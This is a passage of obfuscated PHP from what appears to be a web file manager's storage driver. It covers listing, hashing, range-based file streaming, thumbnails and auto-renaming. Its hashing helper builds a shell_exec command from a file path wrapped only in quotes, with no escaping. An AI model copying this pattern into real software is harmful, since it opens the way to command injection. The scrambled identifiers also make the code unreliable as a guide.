$Ï®¶„„[$ñÖé ¸ú[88]]; } if (!$š­¤âø) { $ë•³ï§¦[] = $¨âÁ˜§Ö; continue; } $ë•³ï§¦[] = $¨âÁ˜§Ö; $à’üé¯› = $Ï®¶„„[$ñÖé ¸ú[87]]; $¥ÑÛÉÊÖ = $this->pathDriver; if (substr($Ï®¶„„[$ñÖé ¸ú[87]], 0, strlen($¥ÑÛÉÊÖ)) == $¥ÑÛÉÊÖ) { $à’üé¯› = substr($à’üé¯›, strlen($¥ÑÛÉÊÖ)); } $this->listAllMake($à’üé¯›, $ë•³ï§¦); } } public function listAllSimple($©†Ã¬ÀÂ, $ØÀŒíî€ = false) { $Ñµóåƒ© = $this->listAll($©†Ã¬ÀÂ); return $this->listAllSimpleMake($Ñµóåƒ©, $this->getPathOuter($©†Ã¬ÀÂ), $ØÀŒíî€); } public function listAllSimpleMake($»º¹ğş¨, $“…¶Î©†, $¤á˜¸ïÙ) { $€ôî¸Å± =& $_SERVER[®»±”ó²]; $§ôÖ¯ = array(); $“…¶Î©† = rtrim(get_path_father($“…¶Î©†), $€ôî¸Å±[8]) . $€ôî¸Å±[8]; foreach ($»º¹ğş¨ as $İ¡‰Á™†) { $¡ŞàÑÕ = array($€ôî¸Å±[87] => $İ¡‰Á™†[$€ôî¸Å±[87]], $€ôî¸Å±[89] => $İ¡‰Á™†[$€ôî¸Å±[87]], $€ôî¸Å±[78] => $İ¡‰Á™†[$€ôî¸Å±[78]]); if (isset($İ¡‰Á™†[$€ôî¸Å±[79]]) && !$İ¡‰Á™†[$€ôî¸Å±[78]]) { $¡ŞàÑÕ[$€ôî¸Å±[79]] = $İ¡‰Á™†[$€ôî¸Å±[79]]; } if (isset($İ¡‰Á™†[$€ôî¸Å±[88]])) { $¡ŞàÑÕ[$€ôî¸Å±[88]] = $İ¡‰Á™†[$€ôî¸Å±[88]]; } if (is_array($İ¡‰Á™†[$€ôî¸Å±[90]])) { $¡ŞàÑÕ[$€ôî¸Å±[89]] = $İ¡‰Á™†[$€ôî¸Å±[90]][$€ôî¸Å±[87]]; $¡ŞàÑÕ[$€ôî¸Å±[79]] = $İ¡‰Á™†[$€ôî¸Å±[90]][$€ôî¸Å±[79]]; $¡ŞàÑÕ[$€ôî¸Å±[88]] = $İ¡‰Á™†[$€ôî¸Å±[90]][$€ôî¸Å±[88]]; } else { if (substr($İ¡‰Á™†[$€ôî¸Å±[87]], 0, strlen($“…¶Î©†)) == $“…¶Î©†) { $¡ŞàÑÕ[$€ôî¸Å±[87]] = substr($İ¡‰Á™†[$€ôî¸Å±[87]], strlen($“…¶Î©†)); } } $„¼öÆªğ = $İ¡‰Á™†[$€ôî¸Å±[78]] ? $€ôî¸Å±[8] : $€ôî¸Å±[12]; $¡ŞàÑÕ[$€ôî¸Å±[89]] = rtrim($¡ŞàÑÕ[$€ôî¸Å±[89]], $€ôî¸Å±[8]) . $„¼öÆªğ; $¡ŞàÑÕ[$€ôî¸Å±[87]] = $€ôî¸Å±[8] . trim($¡ŞàÑÕ[$€ôî¸Å±[87]], $€ôî¸Å±[8]) . $„¼öÆªğ; if (!$¤á˜¸ïÙ) { $®¾„²Şå = explode($€ôî¸Å±[8], trim($¡ŞàÑÕ[$€ôî¸Å±[87]], $€ôî¸Å±[8])); $¡ŞàÑÕ[$€ôî¸Å±[87]] = $€ôî¸Å±[8] . implode($€ôî¸Å±[8], array_slice($®¾„²Şå, 1)) . $„¼öÆªğ; } $§ôÖ¯[] = $¡ŞàÑÕ; } return array_sort_by($§ôÖ¯, $€ôî¸Å±[87]); } public function upload($ñû³ÑéÜ, $¢õ´‹–İ, $‹Å·ÕØÇ = false, $¿öõ×” = REPEAT_REPLACE) { } public function uploadFileByID($ó²µïÃ, $¶Ø›äõ, $á³©Æ¥À) { } public function uploadFileByPath($²ûõÙğı, $à™Ú›, $ó¬úÎ¦ = array()) { } public function isUploadServer() { $ìèéúş =& $_SERVER[®»±”ó²]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ìèéúş[91]) { return !0; } return $GLOBALS[$ìèéúş[6]][$ìèéúş[92]][$ìèéúş[93]]; } public function isFileOutServer() { $‘áäş—„ =& $_SERVER[®»±”ó²]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $‘áäş—„[91]) { return !0; } return $GLOBALS[$‘áäş—„[6]][$‘áäş—„[92]][$‘áäş—„[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($è×†¿) { $ÙøËŒĞ =& $_SERVER[®»±”ó²]; if (!$this->isCdnHost()) { return $è×†¿; } return str_replace(trim(get_url_root($è×†¿), $ÙøËŒĞ[8]), trim($this->cdnHost, $ÙøËŒĞ[8]), $è×†¿); } public function uploadLink($ôÆçÇ¾Ú, $òâ‰óˆÕ = 0) { $ÍŒ±øöè =& $_SERVER[®»±”ó²]; if ($this->isUploadServer()) { return; } $ñú½÷åñ = $this->getType(); if (!in_array($ñú½÷åñ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $°Ï¦şÂ = 1024 * 1024 * 10; $İØ±”¾ = $òâ‰óˆÕ <= $°Ï¦şÂ ? $ÍŒ±øöè[95] : $ÍŒ±øöè[96]; $ÇÕ¹ß÷ú = (!$òâ‰óˆÕ ? 1 : ceil($òâ‰óˆÕ / pow(1024, 3))) * 3600 * 4; $Ï‡Ğ¸¯² = $this->{$İØ±”¾}($ôÆçÇ¾Ú, $ÇÕ¹ß÷ú); if ($Ï‡Ğ¸¯²) { $Ï‡Ğ¸¯²[$ÍŒ±øöè[97]] = $ôÆçÇ¾Ú; $Ï‡Ğ¸¯²[$ÍŒ±øöè[98]] = $ñú½÷åñ; } return $Ï‡Ğ¸¯²; } public function uploadFormData($“úé‡œÏ, $›Õ’‚§ = 3600) { } public function uploadMultiData($õ÷¥—’‘, $Ô´òÎ… = 3600) { } public function multiUploadFormData($ÊöµÜìÙ, $«‰¦•Ü = 3600) { return $this->uploadMultiData($ÊöµÜìÙ, $«‰¦•Ü); } public function download($–ù‡¶åñ, $«¶ÆØ©á) { } public function ext($ğôÒÅÖ) { $ã£ï”Í =& $_SERVER[®»±”ó²]; if (strpos($ğôÒÅÖ, $ã£ï”Í[8]) === -1) { $ğëŠÂ²â = $ğôÒÅÖ; } else { $ğëŠÂ²â = $this->pathThis($ğôÒÅÖ); } $ü¡§ú†Å = $ã£ï”Í[12]; if (strstr($ğëŠÂ²â, $ã£ï”Í[10])) { $ü¡§ú†Å = substr($ğëŠÂ²â, strrpos($ğëŠÂ²â, $ã£ï”Í[10]) + 1); $ü¡§ú†Å = strtolower($ü¡§ú†Å); } if (strlen($ü¡§ú†Å) > 3 && preg_match($ã£ï”Í[99], $ü¡§ú†Å, $‹ƒÑŠĞ)) { $ü¡§ú†Å = $ã£ï”Í[12]; } return $ü¡§ú†Å; } public function pathThis($¯”–­®) { $Ø£ŞñÕ— =& $_SERVER[®»±”ó²]; $¯”–­® = str_replace($Ø£ŞñÕ—[100], $Ø£ŞñÕ—[8], rtrim($¯”–­®, $Ø£ŞñÕ—[8])); $Ôñ”ˆŒØ = strrpos($¯”–­®, $Ø£ŞñÕ—[8]); if ($Ôñ”ˆŒØ === !1) { return $¯”–­®; } return substr($¯”–­®, $Ôñ”ˆŒØ + 1); } public function pathFather($»ã±•²¤) { $ùè–Äï =& $_SERVER[®»±”ó²]; $»ã±•²¤ = str_replace($ùè–Äï[100], $ùè–Äï[8], rtrim($»ã±•²¤, $ùè–Äï[8])); $³¬÷ÍüÕ = strrpos($»ã±•²¤, $ùè–Äï[8]); if ($³¬÷ÍüÕ === !1) { return $ùè–Äï[12]; } return substr($»ã±•²¤, 0, $³¬÷ÍüÕ + 1); } public function hashSimple($…€Àõô¸) { $÷Ñª¢í‹ =& $_SERVER[®»±”ó²]; if (!$…€Àõô¸) { return md5($÷Ñª¢í‹[12]); } $€‘ÒšÒ = $this->size($…€Àõô¸); $‘¥­Ç¥ê = 200; $Â‚¾½ö = 50; if ($€‘ÒšÒ <= $‘¥­Ç¥ê * $Â‚¾½ö) { return $this->hashMd5($…€Àõô¸) . $€‘ÒšÒ; } $×”ÈÌ = intval($€‘ÒšÒ / $Â‚¾½ö); $íœ³Ê÷â = $÷Ñª¢í‹[12]; for ($Áûõ¾¡ë = 0; $Áûõ¾¡ë < $Â‚¾½ö; $Áûõ¾¡ë++) { $íœ³Ê÷â .= $this->fileSubstr($…€Àõô¸, $×”ÈÌ * $Áûõ¾¡ë, $‘¥­Ç¥ê); } $íœ³Ê÷â .= $this->fileSubstr($…€Àõô¸, $€‘ÒšÒ - $‘¥­Ç¥ê, $‘¥­Ç¥ê); return md5($íœ³Ê÷â) . $€‘ÒšÒ; } public static $md5Cache = array(); public function hashMd5($¶ŸÔäÌ™) { if (!$¶ŸÔäÌ™) { return md5($_SERVER[®»±”ó²][12]); } $¶ŸÔäÌ™ = $this->iconvSystem($¶ŸÔäÌ™); if (isset(self::$md5Cache[$¶ŸÔäÌ™])) { return self::$md5Cache[$¶ŸÔäÌ™]; } self::$md5Cache[$¶ŸÔäÌ™] = $this->hashMd5Shell($¶ŸÔäÌ™); if (!self::$md5Cache[$¶ŸÔäÌ™]) { self::$md5Cache[$¶ŸÔäÌ™] = @md5_file($¶ŸÔäÌ™); } return self::$md5Cache[$¶ŸÔäÌ™]; } private function hashMd5Shell($“°Çªá) { $®ĞÂŸòÎ =& $_SERVER[®»±”ó²]; if (!$“°Çªá) { return md5($®ĞÂŸòÎ[12]); } if (!function_exists($®ĞÂŸòÎ[101])) { return !1; } $Ö’ôÇÄ = array($®ĞÂŸòÎ[102], $®ĞÂŸòÎ[103]); $ÚÁáó±× = Cache::get($®ĞÂŸòÎ[104]); if (!$ÚÁáó±×) { $İœš´ş = BASIC_PATH . $®ĞÂŸòÎ[105]; $ŸÍ†Šá¢ = md5_file($İœš´ş); $ÚÁáó±× = $®ĞÂŸòÎ[106]; foreach ($Ö’ôÇÄ as $÷Ó—Ô¥‹) { $“ß‘’€ = shell_exec($÷Ó—Ô¥‹ . "\40\x22{$İœš´ş}\x22"); if ($“ß‘’€ && substr(trim($“ß‘’€), 0, 32) == $ŸÍ†Šá¢) { $ÚÁáó±× = $÷Ó—Ô¥‹; break; } } Cache::set($®ĞÂŸòÎ[104], $ÚÁáó±×, 3600); } if ($ÚÁáó±× == $®ĞÂŸòÎ[106]) { return !1; } $“ß‘’€ = shell_exec($ÚÁáó±× . "\40\x22{$“°Çªá}\x22"); $“ß‘’€ = str_replace($®ĞÂŸòÎ[107], $®ĞÂŸòÎ[12], $“ß‘’€); return substr($“ß‘’€, 0, 32); } public function link($•íï†¡İ) { return $•íï†¡İ; } public function fileOut($½Ë´Ï‹, $ç´¶Ú“é = false, $ÆˆûŸ¶„ = false, $ú×¿Šö§ = '') { $×«³Œë =& $_SERVER[®»±”ó²]; $this->cacheMethod(null, null); if (!$½Ë´Ï‹ || !$this->exist($½Ë´Ï‹)) { show_json(LNG($×«³Œë[108]), !1, $ÆˆûŸ¶„); } $Ìí‡…€Â = $this->getType() == $×«³Œë[109]; $Ö£Ú¿Ê = $GLOBALS[$×«³Œë[6]][$×«³Œë[92]][$×«³Œë[110]][$×«³Œë[111]]; $¯ê¸ğ¶• = (double) $GLOBALS[$×«³Œë[6]][$×«³Œë[92]][$×«³Œë[110]][$×«³Œë[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $½Ÿè«Ã· = $this->infoFull($½Ë´Ï‹); $±½É÷Í = $½Ÿè«Ã·[$×«³Œë[79]]; $Î¾¥–‰¸ = gmdate($×«³Œë[113], $½Ÿè«Ã·[$×«³Œë[88]]); $’••‚´­ = $ÆˆûŸ¶„ ? $ÆˆûŸ¶„ : $this->iconvApp($½Ÿè«Ã·[$×«³Œë[32]]); $Ãµ¡ØĞ = 0; $ê¢Ãî¾¹ = $±½É÷Í - 1; $ûÉ‡³ş¥ = $this->ext($’••‚´­); if (in_array($ûÉ‡³ş¥, array($×«³Œë[114], $×«³Œë[115], $×«³Œë[116], $×«³Œë[117]))) { $ûÉ‡³ş¥ = $×«³Œë[118]; } if (in_array($ûÉ‡³ş¥, array($×«³Œë[119]))) { $ûÉ‡³ş¥ = $×«³Œë[120]; } if (!$ú×¿Šö§) { $ú×¿Šö§ = md5($Î¾¥–‰¸ . $±½É÷Í); } $ú×¿Šö§ = $×«³Œë[121] . $ú×¿Šö§ . $×«³Œë[121]; $Ö‡¨«ìÚ = get_file_mime($ûÉ‡³ş¥); $„Üıßç = !0; $„Üıßç = isset($_GET[$×«³Œë[122]]) ? !1 : !0; if ($ç´¶Ú“é === !1 && !mime_support($Ö‡¨«ìÚ)) { $Ö‡¨«ìÚ = $×«³Œë[123]; } header($×«³Œë[124]); header($×«³Œë[125] . $Ö‡¨«ìÚ); $†ŒªƒÅ = rawurlencode($’••‚´­); $†ŒªƒÅ = $×«³Œë[121] . $†ŒªƒÅ . $×«³Œë[126] . $†ŒªƒÅ; if ($ç´¶Ú“é) { header($×«³Œë[127]); header($×«³Œë[128] . $†ŒªƒÅ); } else { if ($„Üıßç) { header($×«³Œë[129] . $†ŒªƒÅ); } } $úıà»úë = 3600 * 24 * 30; header($×«³Œë[130]); header($×«³Œë[131]); header($×«³Œë[132] . $úıà»úë); header($×«³Œë[133] . gmdate($×«³Œë[113], time() + $úıà»úë) . $×«³Œë[134]); if (isset($_SERVER[$×«³Œë[135]]) && strtotime($_SERVER[$×«³Œë[135]]) == $½Ÿè«Ã·[$×«³Œë[88]]) { header($×«³Œë[136], !0, 304); die; } if (isset($_SERVER[$×«³Œë[137]]) && $_SERVER[$×«³Œë[137]] == $ú×¿Šö§) { header($×«³Œë[138] . $ú×¿Šö§, !0, 304); die; } header($×«³Œë[138] . $ú×¿Šö§); header($×«³Œë[139] . $Î¾¥–‰¸ . $×«³Œë[134]); header($×«³Œë[140] . $’••‚´­); header($×«³Œë[141]); header($×«³Œë[142] . $±½É÷Í); header($×«³Œë[143]); Hook::trigger($×«³Œë[144], $½Ë´Ï‹, $±½É÷Í, $’••‚´­, $ûÉ‡³ş¥); if (!$ç´¶Ú“é && $ûÉ‡³ş¥ == $×«³Œë[145]) { if ($±½É÷Í > 1024 * 1024 * 5) { die; } $ğ¢¤½¦ô = $this->getContent($½Ë´Ï‹); $ğ¢¤½¦ô = Html::clearSVG($ğ¢¤½¦ô); header($×«³Œë[146] . strlen($ğ¢¤½¦ô)); echo $ğ¢¤½¦ô; die; } $Øåı˜Ğ© = strtolower($_SERVER[$×«³Œë[147]]); if ($Ìí‡…€Â && $Øåı˜Ğ© && $Ö£Ú¿Ê) { if (strstr($Øåı˜Ğ©, $×«³Œë[148])) { header($×«³Œë[149] . $½Ë´Ï‹); } else { if (strstr($Øåı˜Ğ©, $×«³Œë[150])) { header($×«³Œë[151] . $½Ë´Ï‹); } else { if (strstr($Øåı˜Ğ©, $×«³Œë[152])) { header($×«³Œë[153] . $½Ë´Ï‹); } } } if ($¯ê¸ğ¶•) { header($×«³Œë[154] . $¯ê¸ğ¶•); } return; } if (isset($_SERVER[$×«³Œë[155]])) { if (preg_match($×«³Œë[156], $_SERVER[$×«³Œë[155]], $¥‰¬ş½É)) { $Ãµ¡ØĞ = intval($¥‰¬ş½É[1]); $Ãµ¡ØĞ = $Ãµ¡ØĞ <= 0 ? 0 : ($Ãµ¡ØĞ >= $ê¢Ãî¾¹ ? $ê¢Ãî¾¹ : $Ãµ¡ØĞ); if (!empty($¥‰¬ş½É[2])) { $ìóÄ‹â = intval($¥‰¬ş½É[2]); $ê¢Ãî¾¹ = $ìóÄ‹â < $Ãµ¡ØĞ ? $Ãµ¡ØĞ : ($ìóÄ‹â >= $ê¢Ãî¾¹ ? $ê¢Ãî¾¹ : $ìóÄ‹â); } } header($×«³Œë[157]); header("\103\157\156\x74\145\x6e\164\x2d\x52\141\156\x67\x65\x3a\x20\x62\171\x74\145\x73\40{$Ãµ¡ØĞ}\55{$ê¢Ãî¾¹}\57" . $±½É÷Í); } else { header($×«³Œë[158]); } header($×«³Œë[159]); header($×«³Œë[160]); $ıõûË™¥ = !0; if ($_SERVER[$×«³Œë[161]] == $×«³Œë[162] && $±½É÷Í > 1204 * 1024 * 1024 * 2) { $ıõûË™¥ = !1; } if ($ıõûË™¥) { header($×«³Œë[163] . ($ê¢Ãî¾¹ - $Ãµ¡ØĞ + 1)); } if ($_SERVER[$×«³Œë[164]] == $×«³Œë[165]) { return; } $Ö»Â¨¾‹ = array($×«³Œë[166] => !1, $×«³Œë[167] => $Ãµ¡ØĞ, $×«³Œë[168] => $ê¢Ãî¾¹, $×«³Œë[169] => $ûÉ‡³ş¥, $×«³Œë[170] => $½Ÿè«Ã·, $×«³Œë[171] => $×«³Œë[12], $×«³Œë[172] => 0); $Ö»Â¨¾‹ = Hook::filter($×«³Œë[173], $Ö»Â¨¾‹); $ğì€¹õ = 1024 * 300; $§¨ŒŸÚ’ = 0; if ($¯ê¸ğ¶•) { $§¨ŒŸÚ’ = intval(1000 * 1000 * ($ğì€¹õ / $¯ê¸ğ¶•)); } while ($Ãµ¡ØĞ <= $ê¢Ãî¾¹) { $é‡òÔ = timeFloat(); check_abort(); $ÅâÎÍÔÊ = $ê¢Ãî¾¹ - $Ãµ¡ØĞ + 1; if ($ÅâÎÍÔÊ <= $ğì€¹õ) { $ğì€¹õ = $ÅâÎÍÔÊ; } $ğ¢¤½¦ô = $this->fileSubstr($½Ë´Ï‹, $Ãµ¡ØĞ, $ğì€¹õ); if ($Ö»Â¨¾‹[$×«³Œë[166]]) { $Ö»Â¨¾‹[$×«³Œë[171]] = $ğ¢¤½¦ô; $Ö»Â¨¾‹[$×«³Œë[172]] = $Ãµ¡ØĞ; $Ö»Â¨¾‹ = Hook::filter($×«³Œë[174], $Ö»Â¨¾‹); $ğ¢¤½¦ô = $Ö»Â¨¾‹[$×«³Œë[171]]; } echo $ğ¢¤½¦ô; $Ãµ¡ØĞ += $ğì€¹õ; if ($ğì€¹õ == $ÅâÎÍÔÊ) { $Ãµ¡ØĞ = $ê¢Ãî¾¹ + 1; } if ($§¨ŒŸÚ’) { $ÍÌ·€¬ë = intval(1000 * 1000 * (timeFloat() - $é‡òÔ)); $øû¤Ö¤ = $§¨ŒŸÚ’ - $ÍÌ·€¬ë; if ($øû¤Ö¤ > 5) { usleep($øû¤Ö¤); } } } } public function fileOutServer($úÁáİŒŸ, $‹Â·İ¦½ = false, $¨Å¤çè¬ = false, $©©¯Š¿ = '') { $this->fileOut($úÁáİŒŸ, $‹Â·İ¦½, $¨Å¤çè¬, $©©¯Š¿); } public function fileOutLink($ıÛ‘Æ¡Ç) { header($_SERVER[®»±”ó²][175] . $ıÛ‘Æ¡Ç); die; } public function cacheMethod($¢“º…ÚŠ, $ØØ”Íİ, $ƒüıĞú³ = null) { $¯¨Ğî÷ƒ =& $_SERVER[®»±”ó²]; static $‡ıàï¬¥ = array(); $û†Ş°‚¥ = $ØØ”Íİ ? ltrim($this->getPathOuter($ØØ”Íİ), $¯¨Ğî÷ƒ[8]) : $¯¨Ğî÷ƒ[12]; $Ğ ƒ¶™Ó = $¯¨Ğî÷ƒ[176] . $¢“º…ÚŠ . $¯¨Ğî÷ƒ[177] . rtrim($û†Ş°‚¥, $¯¨Ğî÷ƒ[8]); if (is_null($¢“º…ÚŠ)) { $‡ıàï¬¥ = array(); return; } if (is_null($ØØ”Íİ)) { foreach ($‡ıàï¬¥ as $Ğ ƒ¶™Ó => $…µ‘•ú) { if (!strstr($Ğ ƒ¶™Ó, $¯¨Ğî÷ƒ[176] . $¢“º…ÚŠ . $¯¨Ğî÷ƒ[178])) { continue; } unset($‡ıàï¬¥[$Ğ ƒ¶™Ó]); } return; } if ($ƒüıĞú³ === $¯¨Ğî÷ƒ[179]) { unset($‡ıàï¬¥[$Ğ ƒ¶™Ó]); return; } if (!is_null($ƒüıĞú³)) { $‡ıàï¬¥[$Ğ ƒ¶™Ó] = $ƒüıĞú³; return; } $ã’•­ = isset($‡ıàï¬¥[$Ğ ƒ¶™Ó]) ? $‡ıàï¬¥[$Ğ ƒ¶™Ó] : null; if (!is_null($ã’•­)) { return $ã’•­; } $ã’•­ = $this->{$¢“º…ÚŠ}($ØØ”Íİ); $‡ıàï¬¥[$Ğ ƒ¶™Ó] = $ã’•­; return $ã’•­; } public function cacheMethodInfoSet($”ÅÕ®î, $©é…§Ó¬, $Î¹èÆŸ¼ = false) { $Ë…¾©™â =& $_SERVER[®»±”ó²]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Ë…¾©™â[180], $”ÅÕ®î, $©é…§Ó¬); $this->cacheMethod($Ë…¾©™â[181], $”ÅÕ®î, $©é…§Ó¬ ? !1 : !0); if (is_array($Î¹èÆŸ¼)) { $this->cacheMethod($Ë…¾©™â[182], $”ÅÕ®î, $Î¹èÆŸ¼); } } public function fileOutImage($ÒÍ¦´íº, $¨ÅÙ¨ƒá = 250) { $Ñ§¹úùï =& $_SERVER[®»±”ó²]; set_timeout(); if (substr($ÒÍ¦´íº, 0, 4) == $Ñ§¹úùï[152]) { $this->fileOutLink($ÒÍ¦´íº); } $ÕãÎÈ« = $this->info($ÒÍ¦´íº); $ëıŒÎÚ¸ = !1; $“÷ë€ãÄ = isset($GLOBALS[$Ñ§¹úùï[183]]) ? $GLOBALS[$Ñ§¹úùï[183]] : array(); if ($“÷ë€ãÄ && $“÷ë€ãÄ[$Ñ§¹úùï[184]] == $ÕãÎÈ«[$Ñ§¹úùï[87]]) { $ÕãÎÈ« = $“÷ë€ãÄ; $É°ÂŸ¡ = $ÕãÎÈ«[$Ñ§¹úùï[185]]; if ($É°ÂŸ¡ && isset($É°ÂŸ¡[$Ñ§¹úùï[186]])) { if ($É°ÂŸ¡[$Ñ§¹úùï[186]] <= $¨ÅÙ¨ƒá && $É°ÂŸ¡[$Ñ§¹úùï[187]] <= $¨ÅÙ¨ƒá) { $ëıŒÎÚ¸ = !0; } } } if ($ÕãÎÈ«[$Ñ§¹úùï[79]] <= 1024 * 50 || $ëıŒÎÚ¸ || !function_exists($Ñ§¹úùï[188]) || $ÕãÎÈ«[$Ñ§¹úùï[169]] == $Ñ§¹úùï[189]) { return $this->fileOut($ÒÍ¦´íº, !1, $ÕãÎÈ«[$Ñ§¹úùï[32]]); } $ŞµÀ¦¿‚ = kodIO::hashPath($ÕãÎÈ«); $¹»ºëâ³ = "\x63\157\x76\x65\x72\137{$ŞµÀ¦¿‚}\137{$¨ÅÙ¨ƒá}\56\160\x6e\x67"; $ª¡îÛ‹… = IO_PATH_SYSTEM_TEMP . $Ñ§¹úùï[190]; $‚ç¿Ã‚ò = IO::infoFullSimple($ª¡îÛ‹…); $ì¥à¾ŒÄ = $‚ç¿Ã‚ò && is_array($‚ç¿Ã‚ò) ? $‚ç¿Ã‚ò[$Ñ§¹úùï[87]] : $Ñ§¹úùï[12]; if (!$ì¥à¾ŒÄ) { $ì¥à¾ŒÄ = IO::mkdir($ª¡îÛ‹…); } if ($ÕãÎÈ«[$Ñ§¹úùï[191]] == $Ñ§¹úùï[192] && isset($ÕãÎÈ«[$Ñ§¹úùï[193]]) && $ÕãÎÈ«[$Ñ§¹úùï[193]] == kodIO::sourceID($ì¥à¾ŒÄ)) { $øšŞ¢’ì = $ÕãÎÈ«[$Ñ§¹úùï[194]]; if ($¨ÅÙ¨ƒá <= 500) { $œŒ¡‚…õ = preg_replace($Ñ§¹úùï[195], $Ñ§¹úùï[196], $ÕãÎÈ«[$Ñ§¹úùï[32]]); $øšŞ¢’ì = IO::fileNameExist($ì¥à¾ŒÄ, $œŒ¡‚…õ); } return IO::fileOut(KodIO::make($øšŞ¢’ì), !1, $ÕãÎÈ«[$Ñ§¹úùï[32]]); } $’ËÃ™Š = IO::fileNameExist($ì¥à¾ŒÄ, $¹»ºëâ³); if ($’ËÃ™Š) { return IO::fileOut(KodIO::make($’ËÃ™Š), !1, $ÕãÎÈ«[$Ñ§¹úùï[32]]); } if ($¨ÅÙ¨ƒá > 1000) { $this->makeImageCover($ì¥à¾ŒÄ, $ÒÍ¦´íº, $¹»ºëâ³, $¨ÅÙ¨ƒá); $this->makeImageCover($ì¥à¾ŒÄ, $ÒÍ¦´íº, "\143\x6f\x76\x65\x72\x5f{$ŞµÀ¦¿‚}\137\62\65\60\x2e\x70\x6e\x67", 250); $’ËÃ™Š = IO::fileNameExist($ì¥à¾ŒÄ, $¹»ºëâ³); if ($’ËÃ™Š) { return IO::fileOut(KodIO::make($’ËÃ™Š), !1, $ÕãÎÈ«[$Ñ§¹úùï[32]]); } die; } if (!kodIO::allowCover($ÕãÎÈ«)) { return $this->fileOut($ÒÍ¦´íº, !1, $ÕãÎÈ«[$Ñ§¹úùï[32]]); } $„íšú¢« = Cache::get($¹»ºëâ³); if ($„íšú¢« == $Ñ§¹úùï[197] || $„íšú¢« == $Ñ§¹úùï[198]) { echo $„íšú¢«; die; } Cache::set($¹»ºëâ³, $Ñ§¹úùï[198], 60); $›ıÕ•îó = array($ì¥à¾ŒÄ, $ÕãÎÈ«[$Ñ§¹úùï[87]], $¹»ºëâ³, $¨ÅÙ¨ƒá); $Éòˆ¶’ = $Ñ§¹úùï[199] . $ÕãÎÈ«[$Ñ§¹úùï[79]] . $Ñ§¹úùï[200] . $¹»ºëâ³ . $Ñ§¹úùï[201] . $ÕãÎÈ«[$Ñ§¹úùï[32]] . $Ñ§¹úùï[202] . $ÕãÎÈ«[$Ñ§¹úùï[87]]; TaskQueue::add($Ñ§¹úùï[203], $›ıÕ•îó, $Éòˆ¶’, $¹»ºëâ³); } public function makeImageCover($×ö¡¼·é, $¢åòîßŸ, $ˆ‰ËØ¡ï, $Õ‘Ú½Ø¹) { $‰µÎÑ =& $_SERVER[®»±”ó²]; if (IO::fileNameExist($×ö¡¼·é, $ˆ‰ËØ¡ï)) { return $‰µÎÑ[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ˆ“¹¾´ = $this->getPathOuter($¢åòîßŸ); $÷öûÖ³ = DATA_THUMB . $ˆ‰ËØ¡ï; del_file($÷öûÖ³); $Š‡ßÏ¨¿ = IO::copy($ˆ“¹¾´, TEMP_FILES, !1, $ˆ‰ËØ¡ï); if (!@file_exists($Š‡ßÏ¨¿)) { return $‰µÎÑ[205]; } ImageThumb::createThumb($Š‡ßÏ¨¿, $÷öûÖ³, $Õ‘Ú½Ø¹, $Õ‘Ú½Ø¹ * 10); if (@file_exists($÷öûÖ³)) { Cache::remove($ˆ‰ËØ¡ï); return IO::move($÷öûÖ³, $×ö¡¼·é); } Cache::set($ˆ‰ËØ¡ï, $‰µÎÑ[197], 600); del_file($÷öûÖ³); return $‰µÎÑ[206] . $Š‡ßÏ¨¿ . $‰µÎÑ[74]; } public function fileOutImageServer($œº°úø, $Î³õŒôÛ = 250) { $this->fileOutImage($œº°úø, $Î³õŒôÛ); } public function fileNameAuto($ı¨™®Ì·, $ÔĞÍ©ÌÂ, $º”£ªäÓ = REPEAT_RENAME, $ôéŞÛÙ¤ = false) { $œ»ÔÖ”Å =& $_SERVER[®»±”ó²]; $ş¢ŠÁÎ = $ı¨™®Ì· === $œ»ÔÖ”Å[12] ? $ÔĞÍ©ÌÂ : rtrim($ı¨™®Ì·, $œ»ÔÖ”Å[8]) . $œ»ÔÖ”Å[8] . $ÔĞÍ©ÌÂ; if ($º”£ªäÓ == REPEAT_REPLACE || !$this->exist($ş¢ŠÁÎ) || $ôéŞÛÙ¤ && $º”£ªäÓ != REPEAT_RENAME_FOLDER) { return $ÔĞÍ©ÌÂ; } if ($º”£ªäÓ == REPEAT_SKIP) { return !1; } $Ÿ®Æº©” = $œ»ÔÖ”Å[10] . get_path_ext($ÔĞÍ©ÌÂ); $Ÿ®Æº©” = $Ÿ®Æº©” == $œ»ÔÖ”Å[10] || $ôéŞÛÙ¤ ? $œ»ÔÖ”Å[12] : $Ÿ®Æº©”; $Ì¼¤‹ã‘ = 1; $ÁÖ¾ïØ¼ = substr($ÔĞÍ©ÌÂ, 0, strlen($ÔĞÍ©ÌÂ) - strlen($Ÿ®Æº©”)); $îŠÃÖØÅ = $ÁÖ¾ïØ¼ . "\50{$Ì¼¤‹ã‘}\51{$Ÿ®Æº©”}"; while ($this->exist(rtrim($ı¨™®Ì·, $œ»ÔÖ”Å[8]) . $œ»ÔÖ”Å[8] . $îŠÃÖØÅ)) { $îŠÃÖØÅ = $ÁÖ¾ïØ¼ . "\50{$Ì¼¤‹ã‘}\51{$Ÿ®Æº©”}"; $Ì¼¤‹ã‘++; } return $îŠÃÖØÅ; } private function fileNameAutoList($§œİ…ûê, $ã³©“æú, $¶ÍÜ—Å  = false) { $ÇËìŸ =& $_SERVER[®»±”ó²]; $ö“®ğ²» = $this->listPath($§œİ…ûê, !0); $ö“®ğ²» = array_merge($ö“®ğ²»[$ÇËìŸ[85]], $ö“®ğ²»[$ÇËìŸ[86]]); $ñ®¦½ÒÚ = array_to_keyvalue($ö“®ğ²», $ÇËìŸ[12], $ÇËìŸ[32]); $ïëÁ—î§ = $ÇËìŸ[10] . get_path_ext($ã³©“æú); $ïëÁ—î§ = $ïëÁ—î§ == $ÇËìŸ[10] || $¶ÍÜ—Å  ? $ÇËìŸ[12] : $ïëÁ—î§; $ˆÌÏóË— = substr($ã³©“æú, 0, strlen($ã³©“æú) - strlen($ïëÁ—î§)); $ë…Øñß“ = $ˆÌÏóË— . "\x28\60\51{$ïëÁ—î§}"; for ($¿ŠŞ…Ğ‘ = 1; $¿ŠŞ…Ğ‘ <= count($ñ®¦½ÒÚ) + 1; 